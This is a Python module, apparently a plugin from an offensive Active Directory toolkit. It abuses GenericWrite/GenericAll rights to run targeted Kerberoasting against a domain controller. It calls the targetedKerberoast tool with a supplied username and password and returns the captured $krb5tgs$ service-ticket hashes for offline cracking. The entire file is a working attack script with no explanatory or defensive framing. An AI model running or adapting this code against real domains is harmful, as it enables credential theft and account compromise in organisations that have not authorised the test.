import subprocess

def run(data, cred, args):
    """
    Abuse GenericWrite/GenericAll to perform targeted Kerberoasting.
    Returns a list of extracted hashes.
    """
    extra = getattr(args, "extra", []) or []
    if len(extra) < 1:
        print("[-] Missing target user")
        return None

    target_user = extra[0]
    ip = data.get("ip")
    domain = data.get("domain")

    if not ip or not domain:
        print("[-] Missing IP or Domain")
        return None

    username = cred.get("user")
    password = cred.get("secret") if cred.get("type") == "password" else None

    if not username or not password:
        print("[-] Need password-based credential")
        return None

    cmd = [
        "targetedKerberoast",
        "-d", domain,
        "-u", username,
        "-p", password,
        "--dc-ip", ip,
    ]

    print(f"[*] Running: {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout + result.stderr
        
        hashes = []
        for line in output.splitlines():
            if "$krb5tgs$" in line:
                hashes.append(line.strip())
        
        return hashes if hashes else None

    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return None